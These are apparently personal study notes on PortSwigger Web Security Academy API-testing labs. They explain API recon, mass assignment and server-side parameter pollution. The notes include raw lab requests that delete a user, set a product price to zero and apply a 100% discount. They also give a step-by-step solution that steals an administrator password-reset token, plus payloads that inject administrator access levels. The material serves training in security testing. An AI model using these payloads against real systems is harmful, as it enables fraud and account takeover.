---
date: 2025-02-25
linktitle: api-testing
title: API Testing
showreadingtime: true
tags: ['PortSwigger']
categories: ['PortSwigger', 'Server-side']
---

## Request Methods:
```
1. GET
2. HEAD
3. POST
4. PUT
5. DELETE
6. PATCH
7. CONNECT
8. OPTIONS
9. TRACE
```

## [Safe, idempotent, and cacheable request methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods#safe_idempotent_and_cacheable_request_methods)

| Method                                                                         | Safe | Idempotent | Cacheable    |
| ------------------------------------------------------------------------------ | ---- | ---------- | ------------ |
| [`GET`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET)         | Yes  | Yes        | Yes          |
| [`HEAD`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD)       | Yes  | Yes        | Yes          |
| [`OPTIONS`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS) | Yes  | Yes        | No           |
| [`TRACE`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/TRACE)     | Yes  | Yes        | No           |
| [`PUT`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT)         | No   | Yes        | No           |
| [`DELETE`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/DELETE)   | No   | Yes        | No           |
| [`POST`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST)       | No   | No         | Conditional* |
| [`PATCH`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PATCH)     | No   | No         | Conditional* |
| [`CONNECT`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/CONNECT) | No   | No         | No           |

## Discovering API documentation

Even if API documentation isn't openly available, you may still be able to access it by browsing applications that use the API.

To do this, you can use Burp Scanner to crawl the API. You can also browse applications manually using Burp's browser. Look for endpoints that may refer to API documentation, for example:

- `/api`
- `/swagger/index.html`
- `/openapi.json`

If you identify an endpoint for a resource, make sure to investigate the base path. For example, if you identify the resource endpoint `/api/swagger/v1/users/123`, then you should investigate the following paths:

- `/api/swagger/v1`
- `/api/swagger`
- `/api`

You can also use a list of common paths to find documentation using Intruder.
### Lab: Exploiting an API endpoint using documentation

```
DELETE /api/user/carlos HTTP/2
Host: 0ac7005d03051466822b76f900910091.web-security-academy.net
Cookie: session=2K6URx8lZXdHczVIDLLYvUc2hfdvtQA5
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ac7005d03051466822b76f900910091.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac7005d03051466822b76f900910091.web-security-academy.net/api
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

```

> **Note:**
> You can use Burp Scanner to crawl the application, then manually investigate interesting attack surface using Burp's browser.
> Also can use `JS Link Finder BApp`

## Identifying supported content types

API endpoints often expect data in a specific format. They may therefore behave differently depending on the content type of the data provided in a request. Changing the content type may enable you to:

- Trigger errors that disclose useful information.
- Bypass flawed defenses.
- Take advantage of differences in processing logic. For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.

To change the content type, modify the `Content-Type` header, then reformat the request body accordingly. You can use the Content type converter BApp to automatically convert data submitted within requests between XML and JSON.

### Lab: Finding and exploiting an unused API endpoint
```
PATCH /api/products/1/price HTTP/2
Host: 0a8a004c048e5f7b8005269100550023.web-security-academy.net
Cookie: session=aPIfAPE8I3cwDfu00yZQY4XCMSvAhfDZ
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8a004c048e5f7b8005269100550023.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Content-Type: application/json
Content-Length: 15

{
"price":0
}
```
## Finding hidden parameters

When you're doing API recon, you may find undocumented parameters that the API supports. You can attempt to use these to change the application's behavior. Burp includes numerous tools that can help you identify hidden parameters:

- Burp Intruder enables you to automatically discover hidden parameters, using a wordlist of common parameter names to replace existing parameters or add new parameters. Make sure you also include names that are relevant to the application, based on your initial recon.
- The Param miner BApp enables you to automatically guess up to 65,536 param names per request. Param miner automatically guesses names that are relevant to the application, based on information taken from the scope.
- The Content discovery tool enables you to discover content that isn't linked from visible content that you can browse to, including parameters.
## Mass assignment vulnerabilities

Mass assignment (also known as auto-binding) can inadvertently create hidden parameters. It occurs when software frameworks automatically bind request parameters to fields on an internal object. Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer.

### Lab: Exploiting a mass assignment vulnerability
```
POST /api/checkout HTTP/2
Host: 0a6a003b040ad2f081d7a87e009300dd.web-security-academy.net
Cookie: session=uzwI26NMHcTZ7ndqUr1cb2maVe1OgJka
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a6a003b040ad2f081d7a87e009300dd.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 150

{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":0}]}
```

## Server-side parameter pollution

Some systems contain internal APIs that aren't directly accessible from the internet. Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding. This means that an attacker may be able to manipulate or inject parameters, which may enable them to, for example:

- Override existing parameters.
- Modify the application behavior.
- Access unauthorized data.

You can test any user input for any kind of parameter pollution. For example, query parameters, form fields, headers, and URL path parameters may all be vulnerable.
>**Note**
This vulnerability is sometimes called HTTP parameter pollution. However, this term is also used to refer to a web application firewall (WAF) bypass technique. To avoid confusion, in this topic we'll only refer to server-side parameter pollution.
In addition, despite the similar name, this vulnerability class has very little in common with server-side prototype pollution.

## Testing for server-side parameter pollution in the query string

To test for server-side parameter pollution in the query string, place query syntax characters like `#`, `&`, and `=` in your input and observe how the application responds.

Consider a vulnerable application that enables you to search for other users based on their username. When you search for a user, your browser makes the following request:

`GET /userSearch?name=peter&back=/home`

To retrieve user information, the server queries an internal API with the following request:

`GET /users/search?name=peter&publicProfile=true`
## Truncating query strings

You can use a URL-encoded `#` character to attempt to truncate the server-side request. To help you interpret the response, you could also add a string after the `#` character.

For example, you could modify the query string to the following:

`GET /userSearch?name=peter%23foo&back=/home`

The front-end will try to access the following URL:

`GET /users/search?name=peter#foo&publicProfile=true`

>**Note:**
It's essential that you URL-encode the `#` character. Otherwise the front-end application will interpret it as a fragment identifier and it won't be passed to the internal API.
Review the response for clues about whether the query has been truncated. For example, if the response returns the user `peter`, the server-side query may have been truncated. If an `Invalid name` error message is returned, the application may have treated `foo` as part of the username. This suggests that the server-side request may not have been truncated.
If you're able to truncate the server-side request, this removes the requirement for the `publicProfile` field to be set to true. You may be able to exploit this to return non-public user profiles.

## Injecting invalid parameters

You can use an URL-encoded `&` character to attempt to add a second parameter to the server-side request.

For example, you could modify the query string to the following:

`GET /userSearch?name=peter%26foo=xyz&back=/home`

This results in the following server-side request to the internal API:

`GET /users/search?name=peter&foo=xyz&publicProfile=true`

Review the response for clues about how the additional parameter is parsed. For example, if the response is unchanged this may indicate that the parameter was successfully injected but ignored by the application.

To build up a more complete picture, you'll need to test further.
## Injecting valid parameters

If you're able to modify the query string, you can then attempt to add a second valid parameter to the server-side request.

#### Related pages

For information on how to identify parameters that you can inject into the query string, see the Finding hidden parameters section.

For example, if you've identified the `email` parameter, you could add it to the query string as follows:

`GET /userSearch?name=peter%26email=foo&back=/home`

This results in the following server-side request to the internal API:

`GET /users/search?name=peter&email=foo&publicProfile=true`

Review the response for clues about how the additional parameter is parsed.
## Overriding existing parameters

To confirm whether the application is vulnerable to server-side parameter pollution, you could try to override the original parameter. Do this by injecting a second parameter with the same name.

For example, you could modify the query string to the following:

`GET /userSearch?name=peter%26name=carlos&back=/home`

This results in the following server-side request to the internal API:

`GET /users/search?name=peter&name=carlos&publicProfile=true`

The internal API interprets two `name` parameters. The impact of this depends on how the application processes the second parameter. This varies across different web technologies. For example:

- **PHP** parses the last parameter only. This would result in a user search for `carlos`.
- **ASP.NET** combines both parameters. This would result in a user search for `peter,carlos`, which might result in an `Invalid username` error message.
- **Node.js / express** parses the first parameter only. This would result in a user search for `peter`, giving an unchanged result.

If you're able to override the original parameter, you may be able to conduct an exploit. For example, you could add `name=administrator` to the request. This may enable you to log in as the administrator user.

### Lab: Exploiting server-side parameter pollution in a query string
#### Solution

1. In Burp's browser, trigger a password reset for the `administrator` user.
    
2. In **Proxy > HTTP history**, notice the `POST /forgot-password` request and the related `/static/js/forgotPassword.js` JavaScript file.
    
3. Right-click the `POST /forgot-password` request and select **Send to Repeater**.
    
4. In the **Repeater** tab, resend the request to confirm that the response is consistent.
    
5. Change the value of the `username` parameter from `administrator` to an invalid username, such as `administratorx`. Send the request. Notice that this results in an `Invalid username` error message.
    
6. Attempt to add a second parameter-value pair to the server-side request using a URL-encoded `&` character. For example, add URL-encoded `&x=y`:
    
    `username=administrator%26x=y`
    
    Send the request. Notice that this returns a `Parameter is not supported` error message. This suggests that the internal API may have interpreted `&x=y` as a separate parameter, instead of part of the username.
    
7. Attempt to truncate the server-side query string using a URL-encoded `#` character:
    
    `username=administrator%23`
    
    Send the request. Notice that this returns a `Field not specified` error message. This suggests that the server-side query may include an additional parameter called `field`, which has been removed by the `#` character.
    
8. Add a `field` parameter with an invalid value to the request. Truncate the query string after the added parameter-value pair. For example, add URL-encoded `&field=x#`:
    
    `username=administrator%26field=x%23`
    
    Send the request. Notice that this results in an `Invalid field` error message. This suggests that the server-side application may recognize the injected field parameter.
    
9. Brute-force the value of the `field` parameter:
    
    1. Right-click the `POST /forgot-password` request and select **Send to Intruder**.
    2. In the **Intruder** tab, add a payload position to the value of the `field` parameter as follows:
        
        `username=administrator%26field=§x§%23`
        
    3. In the **Payloads** side panel, under **Payload configuration**, click **Add from list**. Select the built-in **Server-side variable names** payload list, then start the attack.
    4. Review the results. Notice that the requests with the username and email payloads both return a `200` response.
10. Change the value of the `field` parameter from `x#` to `email`:
    
    `username=administrator%26field=email%23`
    
    Send the request. Notice that this returns the original response. This suggests that `email` is a valid field type.
    
11. In **Proxy > HTTP history**, review the `/static/js/forgotPassword.js` JavaScript file. Notice the password reset endpoint, which refers to the `reset_token` parameter:
    
    `/forgot-password?reset_token=${resetToken}`
    
12. In the **Repeater** tab, change the value of the `field` parameter from `email` to `reset_token`:
    
    `username=administrator%26field=reset_token%23`
    
    Send the request. Notice that this returns a password reset token. Make a note of this.
    
13. In Burp's browser, enter the password reset endpoint in the address bar. Add your password reset token as the value of the `reset_token` parameter . For example:
    
    `/forgot-password?reset_token=123456789`
    
14. Set a new password.
    
15. Log in as the `administrator` user using your password.
    
16. Go to the **Admin panel** and delete `carlos` to solve the lab.

## Testing for server-side parameter pollution in REST paths
`GET /edit_profile.php?name=peter%2f..%2fadmin`
`GET /api/private/users/peter/../admin`

You can attempt to add the `access_level` parameter to the request as follows:

`POST /myaccount name=peter","access_level":"administrator`

If the user input is added to the server-side JSON data without adequate validation or sanitization, this results in the following server-side request:

`PATCH /users/7312/update {name="peter","access_level":"administrator"}`

You can attempt to add the `access_level` parameter to the request as follows:

`POST /myaccount {"name": "peter\",\"access_level\":\"administrator"}`

If the user input is decoded, then added to the server-side JSON data without adequate encoding, this results in the following server-side request:

`PATCH /users/7312/update {"name":"peter","access_level":"administrator"}`

Again, this may result in the user `peter` being given administrator access.

Structured format injection can also occur in responses. For example, this can occur if user input is stored securely in a database, then embedded into a JSON response from a back-end API without adequate encoding. You can usually detect and exploit structured format injection in responses in the same way you can in requests.

> Automated Tools: Backslash Powered Scanning: hunting unknown vulnerability classes whitepaper.

